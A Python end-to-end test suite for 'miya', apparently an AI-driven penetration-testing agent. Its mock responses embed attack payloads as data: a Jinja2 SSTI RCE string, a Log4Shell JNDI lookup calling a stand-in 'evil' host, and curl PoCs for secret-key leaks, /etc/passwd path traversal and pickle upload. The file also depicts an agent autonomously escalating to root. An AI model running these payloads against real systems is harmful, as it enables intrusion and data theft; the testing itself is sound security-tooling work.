"""Hardened E2E tests — edge cases, failure recovery, and deep topology verification.

This file covers scenarios NOT tested in the basic or advanced E2E suites:

1. OODA PIVOT scenarios — coordinator changes strategy mid-mission
2. OODA RETRY scenarios — transient failures trigger retry logic
3. Failed exploit recovery — first technique fails, second succeeds
4. Deep AttackGraph topology — verifies graph node/edge creation, traversal,
   objective detection, and edge status updates during E2E execution
5. Advanced 0-day scenarios — multi-vuln type discovery chains
6. Blackboard feedback loop — verifies context prompt from iteration N
   appears in coordinator prompt for iteration N+1
7. Strengthened assertions on existing shallow tests
"""

from __future__ import annotations

import json
import pytest
import pytest_asyncio

from miya.shared.blackboard import Blackboard
from miya.shared.attack_graph import AttackGraph, GraphNode, GraphEdge
from miya.shared.events import (
    DomainEvent,
    AssetDiscovered,
    FingerprintCompleted,
    VulnerabilityFound,
    CVEMatched,
    ExploitAttempted,
    ExploitSucceeded,
    ExploitFailed,
    PrivilegeEscalated,
    LootCollected,
    ChallengeIdentified,
    ChallengeSolved,
    EntryPointDiscovered,
    TaintPathTraced,
    SinkConfirmed,
    PoCValidated,
    PhaseTransition,
    ReflectionCompleted,
    MissionStarted,
    MissionCompleted,
)
from miya.shared.ports import CoordinatorPort
from miya.shared.types import MissionType, Severity
from miya.infra.event_store import SQLiteEventStore
from miya.mission.service import MissionService, MissionReport

from tests.fixtures.cve_scenarios import (
    LOG4SHELL, SPRING4SHELL, SHELLSHOCK,
    BABY_SQLI, XSS_PLAYGROUND, BABY_PWN, RSA_BABY, REVERSEME,
)


def _ev(event_type: str, **fields: object) -> str:
    """Format an [EVENT:...] marker."""
    return f'[EVENT:{event_type} {json.dumps(fields)}]'


# ═══════════════════════════════════════════════════════════════════
#  Feedback-Tracking Coordinator
# ═══════════════════════════════════════════════════════════════════


class FeedbackTrackingCoordinator:
    """Coordinator that records all prompts for feedback loop verification.

    Also supports multi-iteration with pivot/retry decisions.
    """

    def __init__(self, iteration_responses: list[dict[str, str]]) -> None:
        self.all_prompts: list[str] = []
        self.calls: list[dict] = []
        self._iterations = iteration_responses
        self._current_iteration = 0
        self._call_count = 0

    async def run(self, prompt: str, agents: dict, mcp_servers: list[str]) -> str:
        self.all_prompts.append(prompt)
        self.calls.append({
            "prompt_len": len(prompt),
            "agents": list(agents.keys()),
            "call_num": self._call_count,
        })
        self._call_count += 1

        phase = self._detect_phase(prompt)

        if phase == "REFLECT":
            idx = min(self._current_iteration, len(self._iterations) - 1)
            response = self._iterations[idx].get("REFLECT", "DECISION: complete")
            self._current_iteration += 1
            return response

        idx = min(self._current_iteration, len(self._iterations) - 1)
        if phase and phase in self._iterations[idx]:
            return self._iterations[idx][phase]

        return f"[Mock #{self._call_count}]"

    def _detect_phase(self, prompt: str) -> str | None:
        for phase in ("OBSERVE", "ORIENT", "DECIDE", "ACT", "REFLECT"):
            if f"## {phase}" in prompt or f"Phase: {phase}" in prompt:
                return phase
        return None

    @property
    def iteration_count(self) -> int:
        return self._current_iteration

    def prompts_containing(self, text: str) -> list[str]:
        """Return all prompts that contain the given text."""
        return [p for p in self.all_prompts if text in p]


# ═══════════════════════════════════════════════════════════════════
#  Fixtures
# ═══════════════════════════════════════════════════════════════════


@pytest_asyncio.fixture
async def store():
    s = SQLiteEventStore(":memory:")
    await s.initialize()
    yield s
    await s.close()


# ═══════════════════════════════════════════════════════════════════
#  1. OODA PIVOT — strategy change mid-mission
# ═══════════════════════════════════════════════════════════════════


class TestOODAPivot:
    """Test that the OODA loop handles pivot decisions correctly.

    Scenario: First attempt at exploiting via SQLi fails, coordinator pivots
    to SSTI approach in the second iteration and succeeds.
    """

    @pytest.mark.asyncio
    async def test_pivot_changes_strategy(self, store):
        iterations = [
            # Iteration 1: Discover target + try SQLi (fails)
            {
                "OBSERVE": (
                    "Discovered web app on target. "
                    + _ev("AssetDiscovered",
                          aggregate_id="asset-pivot-target",
                          host="10.0.0.99", ip="10.0.0.99",
                          ports=[80, 443], services=["http", "https"],
                          os="Ubuntu 22.04",
                          context="recon")
                ),
                "ORIENT": (
                    "Potential SQL injection in login form. "
                    + _ev("VulnerabilityFound",
                          vuln_type="SQL Injection",
                          cwe_id="CWE-89",
                          severity="high",
                          location="10.0.0.99:443/login",
                          description="Possible SQLi in login form",
                          context="vuln")
                ),
                "DECIDE": "Plan: Attempt UNION-based SQL injection on login endpoint.",
                "ACT": (
                    "FAILURE — SQLi blocked by WAF. Input sanitized. "
                    + _ev("ExploitAttempted",
                          cve_id="N/A",
                          technique="UNION-based SQLi",
                          payload_summary="' UNION SELECT 1,2,3--",
                          context="exploit")
                    + " "
                    + _ev("ExploitFailed",
                          cve_id="N/A",
                          reason="WAF blocked UNION keyword; input sanitization active",
                          context="exploit")
                ),
                "REFLECT": (
                    "DECISION: pivot\n"
                    "ASSESSMENT: SQLi blocked by WAF, need different approach\n"
                    "INSIGHTS: WAF active, try template injection instead\n"
                    "NEXT_FOCUS: Test for SSTI in user profile template"
                ),
            },
            # Iteration 2: Pivot to SSTI (succeeds)
            {
                "OBSERVE": (
                    "Re-examining target with SSTI lens. Found template rendering. "
                    + _ev("VulnerabilityFound",
                          vuln_type="Server-Side Template Injection",
                          cwe_id="CWE-1336",
                          severity="critical",
                          location="10.0.0.99:443/profile/edit",
                          description="Jinja2 SSTI in profile bio field",
                          context="vuln")
                ),
                "ORIENT": "Confirmed: {{7*7}} returns 49 in profile bio. SSTI exploitable.",
                "DECIDE": "Plan: Exploit SSTI for RCE via Jinja2 sandbox escape.",
                "ACT": (
                    "SUCCESS — SSTI exploited! RCE achieved. "
                    + _ev("ExploitAttempted",
                          cve_id="N/A",
                          technique="Jinja2 SSTI sandbox escape",
                          payload_summary="{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                          context="exploit")
                    + " "
                    + _ev("ExploitSucceeded",
                          cve_id="N/A",
                          access_gained="user",
                          evidence="uid=33(www-data)",
                          context="exploit")
                ),
                "REFLECT": (
                    "DECISION: complete\n"
                    "ASSESSMENT: SSTI exploited after SQLi pivot\n"
                    "INSIGHTS: WAF blocks SQLi but not template injection\n"
                    "NEXT_FOCUS: n/a"
                ),
            },
        ]

        mock = FeedbackTrackingCoordinator(iterations)
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="oneday",
            target_uri="10.0.0.99",
            topology="ooda",
        )

        assert report.status == "completed"
        assert mock.iteration_count == 2, "Should have 2 iterations (SQLi fail → SSTI success)"

        # Verify both exploit attempts recorded
        all_events = await store.load_all()
        attempts = [e for e in all_events if isinstance(e, ExploitAttempted)]
        assert len(attempts) == 2

        # First attempt was SQLi (failed)
        failures = [e for e in all_events if isinstance(e, ExploitFailed)]
        assert len(failures) == 1
        assert "WAF" in failures[0].reason

        # Second attempt was SSTI (succeeded)
        successes = [e for e in all_events if isinstance(e, ExploitSucceeded)]
        assert len(successes) == 1
        assert successes[0].access_gained == "user"

        # Pivot decision recorded in reflections
        reflections = [e for e in all_events if isinstance(e, ReflectionCompleted)]
        assert len(reflections) >= 2
        decisions = [r.decision for r in reflections]
        assert "pivot" in decisions, "First iteration should be a pivot"
        assert "complete" in decisions

        # Two vulnerabilities found (SQLi + SSTI)
        summary = report.blackboard_summary
        assert summary["findings"] >= 2
        assert summary["exploit_attempts"] >= 2
        assert summary["access_level"] == "user"


# ═══════════════════════════════════════════════════════════════════
#  2. OODA RETRY — transient failure then success
# ═══════════════════════════════════════════════════════════════════


class TestOODARetry:
    """Test retry logic: first attempt has transient failure, retry succeeds."""

    @pytest.mark.asyncio
    async def test_retry_after_transient_failure(self, store):
        iterations = [
            # Iteration 1: Discover and try exploit (transient failure)
            {
                "OBSERVE": (
                    "Target running Apache Struts. "
                    + _ev("AssetDiscovered",
                          aggregate_id="asset-retry",
                          host="struts.target.com", ip="10.0.0.77",
                          ports=[8080], services=["http"],
                          os="CentOS 7", context="recon")
                    + " "
                    + _ev("CVEMatched",
                          cve_id="CVE-2017-5638",
                          cvss=10.0,
                          affected_software="Apache Struts 2.3.32",
                          exploit_available=True,
                          context="vuln")
                ),
                "ORIENT": (
                    "Critical Struts2 RCE. "
                    + _ev("VulnerabilityFound",
                          vuln_type="Remote Code Execution",
                          cwe_id="CWE-20",
                          severity="critical",
                          location="10.0.0.77:8080",
                          description="Apache Struts2 Content-Type OGNL injection",
                          context="vuln")
                ),
                "DECIDE": "Exploit CVE-2017-5638 via Content-Type OGNL injection.",
                "ACT": (
                    "FAILURE — Connection timeout during exploit. Network unstable. "
                    + _ev("ExploitAttempted",
                          cve_id="CVE-2017-5638",
                          technique="Content-Type OGNL injection",
                          payload_summary="%{(#_='multipart/form-data').(#dm=@ognl...)}}",
                          context="exploit")
                    + " "
                    + _ev("ExploitFailed",
                          cve_id="CVE-2017-5638",
                          reason="Connection timeout — network transient failure",
                          context="exploit")
                ),
                "REFLECT": (
                    "DECISION: continue\n"
                    "ASSESSMENT: Exploit failed due to network timeout, not defense\n"
                    "INSIGHTS: CVE-2017-5638 should work, retry with longer timeout\n"
                    "NEXT_FOCUS: Same exploit, increased timeout"
                ),
            },
            # Iteration 2: Retry (succeeds)
            {
                "OBSERVE": "Re-confirming target is still up. Port 8080 responsive.",
                "ORIENT": "Same vulnerability, ready for retry.",
                "DECIDE": "Retry CVE-2017-5638 with adjusted timeout.",
                "ACT": (
                    "SUCCESS — Struts2 exploited! "
                    + _ev("ExploitAttempted",
                          cve_id="CVE-2017-5638",
                          technique="Content-Type OGNL injection (retry)",
                          payload_summary="%{(#_='multipart/form-data').(#dm=@ognl...)}}",
                          context="exploit")
                    + " "
                    + _ev("ExploitSucceeded",
                          cve_id="CVE-2017-5638",
                          access_gained="user",
                          evidence="uid=91(tomcat)",
                          context="exploit")
                ),
                "REFLECT": (
                    "DECISION: complete\n"
                    "ASSESSMENT: Retry succeeded\n"
                    "INSIGHTS: Transient failures should be retried\n"
                    "NEXT_FOCUS: n/a"
                ),
            },
        ]

        mock = FeedbackTrackingCoordinator(iterations)
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="oneday",
            target_uri="struts.target.com",
            topology="ooda",
        )

        assert report.status == "completed"
        assert mock.iteration_count == 2

        all_events = await store.load_all()

        # Two exploit attempts
        attempts = [e for e in all_events if isinstance(e, ExploitAttempted)]
        assert len(attempts) == 2

        # One failure, one success
        failures = [e for e in all_events if isinstance(e, ExploitFailed)]
        assert len(failures) == 1
        assert "timeout" in failures[0].reason.lower()

        successes = [e for e in all_events if isinstance(e, ExploitSucceeded)]
        assert len(successes) == 1

        # Continue (retry) decision recorded
        reflections = [e for e in all_events if isinstance(e, ReflectionCompleted)]
        decisions = [r.decision for r in reflections]
        assert "continue" in decisions

        summary = report.blackboard_summary
        assert summary["access_level"] == "user"
        assert summary["exploit_attempts"] >= 2


# ═══════════════════════════════════════════════════════════════════
#  3. Blackboard Feedback Loop Verification
# ═══════════════════════════════════════════════════════════════════


class TestBlackboardFeedbackLoop:
    """Verify that discovered data feeds back into subsequent OODA prompts.

    The blackboard context prompt from iteration N should appear in the
    coordinator prompts for iteration N+1, proving the feedback loop works.
    """

    @pytest.mark.asyncio
    async def test_discovered_asset_appears_in_next_iteration_prompts(self, store):
        """Assets discovered in OBSERVE should appear in subsequent phase prompts."""
        iterations = [
            # Iteration 1: Discover asset
            {
                "OBSERVE": (
                    "Found target. "
                    + _ev("AssetDiscovered",
                          aggregate_id="feedback-asset-1",
                          host="feedback-test.com", ip="192.168.1.100",
                          ports=[22, 80, 443, 3306],
                          services=["ssh", "http", "https", "mysql"],
                          os="Debian 12", context="recon")
                ),
                "ORIENT": (
                    "MySQL exposed. "
                    + _ev("VulnerabilityFound",
                          vuln_type="Exposed Database",
                          cwe_id="CWE-200",
                          severity="high",
                          location="192.168.1.100:3306",
                          description="MySQL accessible without auth",
                          context="vuln")
                ),
                "DECIDE": "Attempt MySQL access.",
                "ACT": (
                    "Got MySQL access. "
                    + _ev("ExploitSucceeded",
                          cve_id="N/A",
                          access_gained="db_read",
                          evidence="mysql> SELECT version();",
                          context="exploit")
                ),
                "REFLECT": (
                    "DECISION: continue\n"
                    "ASSESSMENT: DB access gained, need to escalate\n"
                    "INSIGHTS: MySQL 8.0 with UDF potential\n"
                    "NEXT_FOCUS: UDF privilege escalation"
                ),
            },
            # Iteration 2: Should see iteration 1 data in prompts
            {
                "OBSERVE": "Checking for UDF escalation path.",
                "ORIENT": "UDF path confirmed.",
                "DECIDE": "Exploit UDF.",
                "ACT": (
                    "UDF RCE achieved. "
                    + _ev("ExploitSucceeded",
                          cve_id="N/A",
                          access_gained="root",
                          evidence="uid=0(root)",
                          context="exploit")
                ),
                "REFLECT": (
                    "DECISION: complete\n"
                    "ASSESSMENT: Root via MySQL UDF\n"
                    "INSIGHTS: MySQL UDF escalation\n"
                    "NEXT_FOCUS: n/a"
                ),
            },
        ]

        mock = FeedbackTrackingCoordinator(iterations)
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="oneday",
            target_uri="feedback-test.com",
            topology="ooda",
        )

        assert report.status == "completed"
        assert mock.iteration_count == 2

        # KEY ASSERTION: Iteration 2 prompts should contain data from iteration 1
        # The OBSERVE prompt for iteration 2 should mention the discovered asset
        iter2_prompts = mock.all_prompts[5:]  # Prompts from iteration 2 (after 5 calls from iter 1)

        # The blackboard context should include the asset discovered in iter 1
        prompts_with_asset = mock.prompts_containing("192.168.1.100")
        # Should appear in iteration 2 prompts (blackboard context is embedded)
        assert len(prompts_with_asset) >= 5, (
            "Asset from iter 1 should feed back into iter 2 prompts via blackboard"
        )

        # The vulnerability found in iter 1 should also appear
        prompts_with_vuln = mock.prompts_containing("Exposed Database")
        assert len(prompts_with_vuln) >= 1, (
            "Vulnerability from iter 1 should appear in iter 2 blackboard context"
        )

        # The access level from iter 1 should appear
        prompts_with_access = mock.prompts_containing("db_read")
        assert len(prompts_with_access) >= 1, (
            "Access level from iter 1 should feed back via blackboard"
        )

    @pytest.mark.asyncio
    async def test_cve_match_feeds_into_subsequent_prompts(self, store):
        """CVE matches from ORIENT should appear in DECIDE/ACT prompts."""
        iterations = [
            {
                "OBSERVE": (
                    "Scanning target. "
                    + _ev("AssetDiscovered",
                          aggregate_id="feedback-cve-asset",
                          host="cve-feedback.com", ip="10.0.0.88",
                          ports=[8080], services=["http"],
                          os="Linux", context="recon")
                ),
                "ORIENT": (
                    "CVE matched. "
                    + _ev("CVEMatched",
                          cve_id="CVE-2021-44228",
                          cvss=10.0,
                          affected_software="Apache Log4j 2.14.1",
                          exploit_available=True,
                          context="vuln")
                ),
                "DECIDE": "Exploit Log4Shell.",
                "ACT": (
                    "Exploited. "
                    + _ev("ExploitSucceeded",
                          cve_id="CVE-2021-44228",
                          access_gained="user",
                          evidence="uid=1000(app)",
                          context="exploit")
                ),
                "REFLECT": "DECISION: complete\nASSESSMENT: Done\nINSIGHTS: Log4Shell\nNEXT_FOCUS: n/a",
            },
        ]

        mock = FeedbackTrackingCoordinator(iterations)
        service = MissionService(event_store=store, coordinator=mock)
        await service.execute(mission_type="oneday", target_uri="cve-feedback.com", topology="ooda")

        # The CVE match from ORIENT should appear in DECIDE prompt (via blackboard)
        # DECIDE is the 3rd call (0=OBSERVE, 1=ORIENT, 2=DECIDE)
        decide_prompt = mock.all_prompts[2]
        assert "CVE-2021-44228" in decide_prompt, (
            "CVE from ORIENT should appear in DECIDE via blackboard context"
        )

        # ACT prompt should also have it
        act_prompt = mock.all_prompts[3]
        assert "CVE-2021-44228" in act_prompt, (
            "CVE from ORIENT should appear in ACT via blackboard context"
        )


# ═══════════════════════════════════════════════════════════════════
#  4. Deep AttackGraph Topology E2E
# ═══════════════════════════════════════════════════════════════════


class AttackGraphCoordinator:
    """Coordinator that emits events suitable for AttackGraph topology.

    The AttackGraph topology uses different prompts (Recon, Plan, Execute)
    than OODA. This coordinator responds to those prompts.
    """

    def __init__(self, responses: list[dict[str, str]]) -> None:
        self.calls: list[dict] = []
        self._responses = responses
        self._call_idx = 0

    async def run(self, prompt: str, agents: dict, mcp_servers: list[str]) -> str:
        self.calls.append({"prompt": prompt[:300], "call_idx": self._call_idx})
        self._call_idx += 1

        # Match by keyword in prompt
        for resp_dict in self._responses:
            for keyword, response in resp_dict.items():
                if keyword.lower() in prompt.lower():
                    return response

        return f"[AttackGraph mock #{self._call_idx}] SUCCESS"


class TestDeepAttackGraphTopology:
    """Verify AttackGraph topology creates proper graph structures during E2E."""

    @pytest.mark.asyncio
    async def test_attack_graph_builds_nodes_and_edges(self, store):
        """AttackGraph topology should create graph nodes from discovered assets."""
        responses = [
            {
                "reconnaissance": (
                    "Discovered web server and database. "
                    + _ev("AssetDiscovered",
                          aggregate_id="ag-web",
                          host="web.target.com", ip="10.0.0.1",
                          ports=[80, 443], services=["http", "https"],
                          os="Ubuntu", context="recon")
                    + " "
                    + _ev("AssetDiscovered",
                          aggregate_id="ag-db",
                          host="db.target.com", ip="10.0.0.2",
                          ports=[3306], services=["mysql"],
                          os="Ubuntu", context="recon")
                    + " "
                    + _ev("VulnerabilityFound",
                          vuln_type="SQL Injection",
                          cwe_id="CWE-89",
                          severity="critical",
                          location="10.0.0.1:443/api",
                          description="SQLi in API endpoint",
                          context="vuln")
                ),
                "strategic planner": (
                    "SELECTED_EDGE: edge-1\n"
                    "AGENT: exploit\n"
                    "RATIONALE: SQLi is the highest-probability path\n"
                    "SUCCESS — SQLi exploited. "
                    + _ev("ExploitAttempted",
                          cve_id="N/A",
                          technique="UNION SQLi",
                          payload_summary="' UNION SELECT ...",
                          context="exploit")
                    + " "
                    + _ev("ExploitSucceeded",
                          cve_id="N/A",
                          access_gained="db_admin",
                          evidence="mysql> GRANT ALL",
                          context="exploit")
                ),
                "tactical executor": (
                    "SUCCESS — Executed SQLi. Gained DB access. "
                    + _ev("ExploitSucceeded",
                          cve_id="N/A",
                          access_gained="db_admin",
                          evidence="mysql> SELECT * FROM users",
                          context="exploit")
                ),
            },
        ]

        mock = AttackGraphCoordinator(responses)
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="oneday",
            target_uri="web.target.com",
            topology="attack_graph",
        )

        assert report.status == "completed"
        assert report.topology == "attack_graph"
        assert report.events_count > 0

        # Verify blackboard has assets from graph recon
        summary = report.blackboard_summary
        assert summary["assets"] >= 2, "Web + DB assets should be discovered"

        # Verify graph was built (nodes from AssetDiscovered + VulnerabilityFound)
        # Attack graph nodes: root + objective + discovered assets + vulns
        assert "AttackGraph" in summary["attack_graph"]

        # Events persisted correctly
        all_events = await store.load_all()
        asset_events = [e for e in all_events if isinstance(e, AssetDiscovered)]
        assert len(asset_events) >= 2

    @pytest.mark.asyncio
    async def test_attack_graph_with_exploit_events(self, store):
        """Verify exploit events are correctly extracted in AttackGraph topology.

        The AttackGraph topology only runs plan/execute if graph has edges.
        Since our mock doesn't create edges, all events must come from the
        recon phase output (which is always executed).
        """
        responses = [
            {
                "reconnaissance": (
                    "Found target. Immediately exploitable via Log4Shell. "
                    + _ev("AssetDiscovered",
                          aggregate_id="ag-target",
                          host="10.0.0.5", ip="10.0.0.5",
                          ports=[22, 80], services=["ssh", "http"],
                          os="Linux", context="recon")
                    + " "
                    + _ev("CVEMatched",
                          cve_id="CVE-2021-44228",
                          cvss=10.0,
                          affected_software="Log4j 2.14.1",
                          exploit_available=True,
                          context="vuln")
                    + " "
                    + _ev("ExploitAttempted",
                          cve_id="CVE-2021-44228",
                          technique="JNDI injection",
                          payload_summary="${jndi:ldap://evil/a}",
                          context="exploit")
                    + " "
                    + _ev("ExploitSucceeded",
                          cve_id="CVE-2021-44228",
                          access_gained="user",
                          evidence="uid=1000(app)",
                          context="exploit")
                ),
                "strategic planner": "SUCCESS — No further steps needed.",
                "tactical executor": "SUCCESS — Already exploited in recon.",
            },
        ]

        mock = AttackGraphCoordinator(responses)
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="oneday",
            target_uri="10.0.0.5",
            topology="attack_graph",
        )

        assert report.status == "completed"
        summary = report.blackboard_summary
        assert summary["cve_matches"] >= 1
        assert summary["access_level"] == "user"

        all_events = await store.load_all()
        exploit_events = [e for e in all_events if isinstance(e, ExploitSucceeded)]
        assert len(exploit_events) >= 1


# ═══════════════════════════════════════════════════════════════════
#  5. Advanced 0-Day Discovery — multi-vuln type chain
# ═══════════════════════════════════════════════════════════════════


class TestAdvancedZerodayDiscovery:
    """Advanced 0-day discovery: multiple vuln types across multiple iterations."""

    @pytest.mark.asyncio
    async def test_multi_vuln_zeroday_chain(self, store):
        """Discover SSTI + Path Traversal + Deserialization in one codebase."""
        iterations = [
            # Iteration 1: Discover entry points
            {
                "OBSERVE": (
                    "Discovered Django app with multiple entry points. "
                    + _ev("EntryPointDiscovered",
                          endpoint="/api/v2/render",
                          input_vectors=["body_param:template", "query_param:engine"],
                          framework="Django",
                          context="entrypoint")
                    + " "
                    + _ev("EntryPointDiscovered",
                          endpoint="/api/v2/files/download",
                          input_vectors=["query_param:path"],
                          framework="Django",
                          context="entrypoint")
                    + " "
                    + _ev("EntryPointDiscovered",
                          endpoint="/api/v2/import",
                          input_vectors=["file_upload:data"],
                          framework="Django",
                          context="entrypoint")
                ),
                "ORIENT": (
                    "Tracing data flows. "
                    + _ev("TaintPathTraced",
                          source="request.body['template']",
                          sink="django.template.Template()",
                          path=["render_view", "compile_template", "Template.__init__"],
                          sanitized=False,
                          context="dataflow")
                    + " "
                    + _ev("TaintPathTraced",
                          source="request.GET['path']",
                          sink="open(os.path.join(base_dir, path))",
                          path=["download_view", "resolve_path", "open"],
                          sanitized=False,
                          context="dataflow")
                    + " "
                    + _ev("TaintPathTraced",
                          source="request.FILES['data']",
                          sink="pickle.loads(data.read())",
                          path=["import_view", "parse_data", "pickle.loads"],
                          sanitized=False,
                          context="dataflow")
                ),
                "DECIDE": "Confirm all three sinks.",
                "ACT": (
                    "Confirming sinks. "
                    + _ev("SinkConfirmed",
                          sink_type="SSTI",
                          cwe_id="CWE-1336",
                          exploitability="high",
                          context="sink")
                    + " "
                    + _ev("SinkConfirmed",
                          sink_type="Path Traversal",
                          cwe_id="CWE-22",
                          exploitability="high",
                          context="sink")
                ),
                "REFLECT": (
                    "DECISION: continue\n"
                    "ASSESSMENT: Found SSTI + Path Traversal, still need to confirm deserialization\n"
                    "INSIGHTS: 2/3 sinks confirmed\n"
                    "NEXT_FOCUS: Confirm pickle deserialization sink and build PoCs"
                ),
            },
            # Iteration 2: Confirm remaining sink + build PoCs
            {
                "OBSERVE": "Re-examining pickle deserialization sink.",
                "ORIENT": (
                    "Pickle sink confirmed. "
                    + _ev("SinkConfirmed",
                          sink_type="Insecure Deserialization",
                          cwe_id="CWE-502",
                          exploitability="critical",
                          context="sink")
                ),
                "DECIDE": "Build PoCs for all three vulnerabilities.",
                "ACT": (
                    "PoCs validated. "
                    + _ev("PoCValidated",
                          vuln_type="Server-Side Template Injection",
                          poc_code="curl -d 'template={{settings.SECRET_KEY}}' /api/v2/render",
                          result="SECRET_KEY=django-insecure-xxx exposed",
                          context="poc")
                    + " "
                    + _ev("PoCValidated",
                          vuln_type="Path Traversal",
                          poc_code="curl '/api/v2/files/download?path=../../../etc/passwd'",
                          result="root:x:0:0:root:/root:/bin/bash",
                          context="poc")
                    + " "
                    + _ev("PoCValidated",
                          vuln_type="Insecure Deserialization",
                          poc_code="curl -F 'data=@payload.pkl' /api/v2/import",
                          result="RCE via pickle.loads — os.system('id') → uid=33(www-data)",
                          context="poc")
                ),
                "REFLECT": (
                    "DECISION: complete\n"
                    "ASSESSMENT: All 3 0-days confirmed with PoCs\n"
                    "INSIGHTS: SSTI, Path Traversal, and Deserialization RCE\n"
                    "NEXT_FOCUS: n/a"
                ),
            },
        ]

        mock = FeedbackTrackingCoordinator(iterations)
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="zeroday",
            target_uri="./django-app",
            target_kind="source",
            topology="ooda",
        )

        assert report.status == "completed"
        assert mock.iteration_count == 2

        all_events = await store.load_all()

        # 3 entry points discovered
        entry_points = [e for e in all_events if isinstance(e, EntryPointDiscovered)]
        assert len(entry_points) == 3

        # 3 taint paths traced (all unsanitized)
        taint_paths = [e for e in all_events if isinstance(e, TaintPathTraced)]
        assert len(taint_paths) == 3
        assert all(not t.sanitized for t in taint_paths), "All paths should be unsanitized"

        # 3 sinks confirmed
        sinks = [e for e in all_events if isinstance(e, SinkConfirmed)]
        assert len(sinks) == 3
        sink_types = {s.sink_type for s in sinks}
        assert sink_types == {"SSTI", "Path Traversal", "Insecure Deserialization"}

        # 3 PoCs validated
        pocs = [e for e in all_events if isinstance(e, PoCValidated)]
        assert len(pocs) == 3

        # Blackboard summary
        summary = report.blackboard_summary
        bb = Blackboard()
        bb.apply_all(all_events)

        assert len(bb.entry_points) == 3
        assert len(bb.taint_paths) == 3
        assert len(bb.confirmed_sinks) == 3
        assert len(bb.validated_pocs) == 3

        # Context prompt should show all vuln types
        prompt = bb.to_context_prompt()
        assert "Unsanitized" in prompt
        assert "/api/v2/render" in prompt
        assert "/api/v2/files/download" in prompt


# ═══════════════════════════════════════════════════════════════════
#  6. Strengthened Pipeline Tests — deepen existing shallow tests
# ═══════════════════════════════════════════════════════════════════


class TestDeepenedPipelineAssertions:
    """Deepen the assertions on basic scenarios that were previously shallow."""

    @pytest.mark.asyncio
    async def test_shellshock_deep_blackboard_verification(self, store):
        """Deep verification of Shellshock scenario beyond status check."""
        from tests.e2e.test_pipeline_e2e import (
            MockCoordinator, _build_ooda_responses_for_cve,
        )
        scenario = SHELLSHOCK
        mock = MockCoordinator(_build_ooda_responses_for_cve(scenario, "10.0.0.20"))
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="oneday", target_uri="10.0.0.20", topology="ooda",
        )

        assert report.status == "completed"
        summary = report.blackboard_summary

        # Deep assertions
        assert summary["assets"] >= 1
        assert summary["findings"] >= 1
        assert summary["cve_matches"] >= 1
        assert summary["exploit_attempts"] >= 1
        assert summary["access_level"] == "user"

        # CVE correctly identified
        all_events = await store.load_all()
        cves = [e for e in all_events if isinstance(e, CVEMatched)]
        assert any(c.cve_id == "CVE-2014-6271" for c in cves)
        assert any(c.cvss == 10.0 for c in cves)

        # Fingerprint recorded
        fps = [e for e in all_events if isinstance(e, FingerprintCompleted)]
        assert any(f.software == "GNU Bash" for f in fps)

        # Report text quality
        text = report.as_text()
        assert "CRITICAL" in text
        assert report.critical_count >= 1

    @pytest.mark.asyncio
    async def test_baby_sqli_deep_ctf_verification(self, store):
        """Deep verification of Baby SQLi CTF scenario."""
        from tests.e2e.test_pipeline_e2e import (
            MockCoordinator, _build_ooda_responses_for_ctf,
        )
        scenario = BABY_SQLI
        mock = MockCoordinator(_build_ooda_responses_for_ctf(scenario))
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="ctf",
            target_uri="https://ctf.example.com/chall/sqli",
            topology="ooda",
        )

        assert report.status == "completed"

        all_events = await store.load_all()

        # Challenge identified with correct metadata
        challenges = [e for e in all_events if isinstance(e, ChallengeIdentified)]
        assert len(challenges) >= 1
        assert challenges[0].challenge_name == "Baby SQLi"
        assert challenges[0].category == "web"
        assert challenges[0].points == 100

        # Challenge solved with correct flag
        solved = [e for e in all_events if isinstance(e, ChallengeSolved)]
        assert len(solved) >= 1
        assert solved[0].flag == "flag{un10n_1nj3ct10n_b4by}"
        assert "SQL injection" in solved[0].approach or "Union" in solved[0].approach

        # Blackboard tracks challenge
        bb = Blackboard()
        bb.apply_all(all_events)
        assert len(bb.challenges) >= 1
        assert len(bb.solved_flags) >= 1

        prompt = bb.to_context_prompt()
        assert "DONE" in prompt
        assert "Baby SQLi" in prompt

    @pytest.mark.asyncio
    @pytest.mark.parametrize("scenario,expected_flag", [
        (XSS_PLAYGROUND, "flag{d0m_purify_byp4ss}"),
        (BABY_PWN, "flag{r3t2sh3llc0d3}"),
        (RSA_BABY, "flag{sm4ll_e_n0_p4dd1ng}"),
        (REVERSEME, "flag{str1ngs_4nd_gh1dr4}"),
    ])
    async def test_ctf_scenarios_deep_flag_verification(self, store, scenario, expected_flag):
        """Verify each CTF scenario captures the correct flag."""
        from tests.e2e.test_pipeline_e2e import (
            MockCoordinator, _build_ooda_responses_for_ctf,
        )
        mock = MockCoordinator(_build_ooda_responses_for_ctf(scenario))
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="ctf",
            target_uri=f"https://ctf.example.com/chall/{scenario.category}",
            topology="ooda",
        )

        assert report.status == "completed"

        all_events = await store.load_all()
        solved = [e for e in all_events if isinstance(e, ChallengeSolved)]
        assert len(solved) >= 1
        assert solved[0].flag == expected_flag, (
            f"{scenario.name}: expected flag {expected_flag}, got {solved[0].flag}"
        )
        assert solved[0].challenge_name == scenario.name


# ═══════════════════════════════════════════════════════════════════
#  7. Multi-mission Isolation Test
# ═══════════════════════════════════════════════════════════════════


class TestMultiMissionIsolation:
    """Verify multiple missions on the same store don't contaminate each other."""

    @pytest.mark.asyncio
    async def test_sequential_missions_accumulate_events(self, store):
        """Running two missions sequentially should accumulate events correctly."""
        from tests.e2e.test_pipeline_e2e import (
            MockCoordinator, _build_ooda_responses_for_cve, _build_ooda_responses_for_ctf,
        )

        # Mission 1: CVE exploitation
        mock1 = MockCoordinator(_build_ooda_responses_for_cve(LOG4SHELL, "10.0.0.5"))
        service1 = MissionService(event_store=store, coordinator=mock1)
        report1 = await service1.execute(
            mission_type="oneday", target_uri="10.0.0.5", topology="ooda",
        )

        events_after_m1 = await store.count()
        assert events_after_m1 > 0

        # Mission 2: CTF challenge (uses fresh coordinator but same store)
        mock2 = MockCoordinator(_build_ooda_responses_for_ctf(BABY_SQLI))
